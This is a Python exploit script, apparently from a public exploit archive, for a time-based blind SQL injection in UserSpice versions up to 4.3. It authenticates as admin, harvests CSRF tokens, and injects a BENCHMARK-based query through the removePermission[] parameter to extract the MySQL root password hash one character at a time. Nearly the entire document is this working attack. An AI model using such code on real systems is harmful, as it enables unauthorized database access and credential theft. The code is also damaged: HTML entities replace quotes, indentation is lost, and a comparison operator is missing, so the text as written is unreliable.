"""
Application UserSpice PHP user management
Vulnerability UserSpice <= 4.3 Blind SQL Injection exploit
URL https://userspice.com
Date 1.2.2018
Author Dolev Farhi
 
About the App:
What makes userspice different from almost any other PHP User Management
Framework is that it has been designed from the
beginning to get out of your way so you can spend your time working on
your project
 
About the vulnerability:
Unsanitized input passed to removePermission parameter.
"""
 
import requests
import string
import sys
 
from bs4 import BeautifulSoup
 
userspice_host = &#039;10.0.0.16&#039;
userspice_user = &#039;admin&#039;
userspice_pass = &#039;password&#039;
userspice_login_url = &#039;http://%s//users/login.php&#039; % userspice_host
userspice_vuln_url = &#039;http://%s/users/admin_page.php?id=75&#039; %
userspice_host
guess_chars = string.ascii_lowercase + string.ascii_uppercase +
string.digits + string.punctuation
 
 
banner = """
-------------------------------------------------------
| userSpice <= 4.3 Blind SQL Injection Vulnerability" |
-------------------------------------------------------
"""
 
login_data = {
&#039;dest&#039;:&#039;&#039;,
&#039;username&#039;:userspice_user,
&#039;password&#039;:userspice_pass
}
 
payload = {
&#039;process&#039;:&#039;1&#039;,
&#039;removePermission[]&#039;:&#039;1&#039;,
&#039;private&#039;:&#039;Yes&#039;,
&#039;changeTitle&#039;:&#039;&#039;
}
 
s = requests.session()
 
def getCSRF(url):
req = s.get(url).text
soup = BeautifulSoup(req, "lxml")
csrf = soup.find(&#039;input&#039;, {"name" : "csrf"})
csrf_token = csrf[&#039;value&#039;]
return csrf_token
 
login_data_csrf = getCSRF(userspice_login_url)
login_data[&#039;csrf&#039;] = login_data_csrf
req = s.post(userspice_login_url, data=login_data)
 
if &#039;login failed&#039; in req.text.lower():
print(&#039;Login failed, check username/password&#039;)
sys.exit(1)
 
payload_data_csrf = getCSRF(userspice_vuln_url)
payload[&#039;csrf&#039;] = payload_data_csrf
print(banner)
print(&#039;[+] Running...&#039;)
print(&#039;[+] Obtaining MySQL root hash... this may take some time.&#039;)
password = ""
for i in range(0, 61):
for c in guess_chars:
payload_data_csrf = getCSRF(userspice_vuln_url)
payload[&#039;csrf&#039;] = payload_data_csrf
injection = "5); SELECT 1 UNION SELECT IF(BINARY
SUBSTRING(password,{0},1)=&#039;{1}&#039;,BENCHMARK(3000000,SHA1(1)),0) Password
FROM mysql.user WHERE User = &#039;root&#039;#;".format(i, c)
payload[&#039;removePermission[]&#039;] = injection
req = s.post(userspice_vuln_url, data=payload).elapsed.total_seconds()
if float(req) 0.6:
password += c
print(&#039;[+] %s&#039; % password)
else:
pass
 
print(&#039;done&#039;)
sys.exit(0)

